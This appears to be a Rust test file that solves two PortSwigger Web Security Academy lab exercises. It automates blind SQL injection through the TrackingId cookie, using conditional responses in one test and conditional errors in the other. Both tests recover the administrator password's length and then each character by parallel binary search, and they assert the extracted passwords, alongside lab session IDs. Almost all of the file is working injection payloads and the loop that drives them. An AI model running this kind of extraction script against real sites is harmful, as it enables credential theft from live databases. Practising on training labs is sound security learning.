#[cfg(test)]
mod tests {
    use rayon::iter::{IntoParallelIterator, ParallelIterator};
    use std::sync::mpsc;

    fn check(
        payload: String,
        session_id: String,
        client: &reqwest::blocking::Client,
        url: &str,
        expected_response: &str,
    ) -> bool {
        let encoded = urlencoding::encode(&payload);
        let resp = client
            .get(url)
            .header(
                "Cookie",
                format!("TrackingId={}, session={}", encoded, session_id),
            )
            .send()
            .expect("Failed to send request")
            .text()
            .expect("Failed to read response");

        resp.contains(expected_response)
    }

    #[test]
    fn blind_sql_injection_with_conditional_responses() {
        let client = reqwest::blocking::Client::new();
        let session_id = "kcKclKY99JaMi54bhUBKzikzfLsWfkhP".to_string();
        let url = "https://0ada00a10404ba8d801bcb26002d0030.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories";

        let lengths: Vec<usize> = (1..=20).into_iter().collect();

        let (sender, receiver) = mpsc::channel();

        lengths.into_par_iter().for_each(|length| {
            let client = client.clone();
            let payload = format!("' union select 'a' from users where username='administrator' and length(password)={} -- ", length);
            if check(payload, session_id.clone(), &client, url, "<div>Welcome Back!</div>") {
                sender.send(length).unwrap();
            }
        });

        let length = receiver.recv().unwrap();
        assert_eq!(length, 20);

        let (sender, receiver) = std::sync::mpsc::channel();

        (1..=length).into_par_iter().for_each(|pos| {
            let mut left = 32;
            let mut right = 126;

            let client = client.clone();
            let session_id = session_id.clone();

            while left <= right {
                let mid: u8 = left + (right - left) / 2;

                let payload_greater = format!("' union select 'a' from users where username='administrator' and ascii(substring(password,{},1))>{} -- ", pos, mid);
                let payload_curr = format!("' union select 'a' from users where username='administrator' and ascii(substring(password,{},1))={} -- ", pos, mid);

                if check(payload_curr.clone(), session_id.clone(), &client, url, "<div>Welcome Back!</div>") {
                    sender.send((pos, mid as char)).unwrap();
                    break;
                } else if check(payload_greater.clone(), session_id.clone(), &client, url, "<div>Welcome Back!</div>") {
                    left = mid + 1
                } else {
                    if mid == 0 { break; }
                    right = mid - 1;
                }
            }
        });

        let mut password = vec!['0'; length];
        for (pos, c) in receiver.iter().take(length) {
            password[pos - 1] = c;
        }

        assert_eq!(
            password.iter().collect::<String>(),
            "uek7ez97glg8ba6g8eav".to_string()
        );
    }

    #[test]
    fn blind_sql_injection_with_conditional_errors() {
        let client = reqwest::blocking::Client::new();
        let session_id = "vvRiK49eWcWDgdiTb9BWQ4YyVT07xEmY".to_string();
        let url = "https://0ae100f804ff59828072088e006b00a6.web-security-academy.net/filter?category=Lifestyle";

        let lengths: Vec<usize> = (1..=20).into_iter().collect();

        let (sender, receiver) = mpsc::channel();

        lengths.into_par_iter().for_each(|length| {
            let client = client.clone();
            let payload = format!("'union select case when length(password)={} then to_char(1/0) else to_char(1) end from users where username='administrator' -- ", length);
            if check(payload, session_id.clone(), &client, url, "Internal Server Error") {
                sender.send(length).unwrap();
            }
        });

        let length = receiver.recv().unwrap();
        assert_eq!(length, 20);

        let (sender, receiver) = std::sync::mpsc::channel();

        (1..=length).into_par_iter().for_each(|pos| {
            let mut left = 32;
            let mut right = 126;

            let client = client.clone();
            let session_id = session_id.clone();

            while left <= right {
                let mid: u8 = left + (right - left) / 2;

                let payload_greater = format!("'union select case when ascii(substr(password, {}, 1))>{} then to_char(1/0) else to_char(1) end from users where username='administrator' -- ", pos, mid);
                let payload_curr = format!("'union select case when ascii(substr(password, {}, 1))={} then to_char(1/0) else to_char(1) end from users where username='administrator' -- ", pos, mid);

                if check(payload_curr.clone(), session_id.clone(), &client, url, "Internal Server Error") {
                    sender.send((pos, mid as char)).unwrap();
                    break;
                } else if check(payload_greater.clone(), session_id.clone(), &client, url, "Internal Server Error") {
                    left = mid + 1
                } else {
                    if mid == 0 { break; }
                    right = mid - 1;
                }
            }
        });

        let mut password = vec!['0'; length];
        for (pos, c) in receiver.iter().take(length) {
            password[pos - 1] = c;
        }

        assert_eq!(
            password.iter().collect::<String>(),
            "ieztzogds7fm2ftcvr3h".to_string()
        );
    }
}
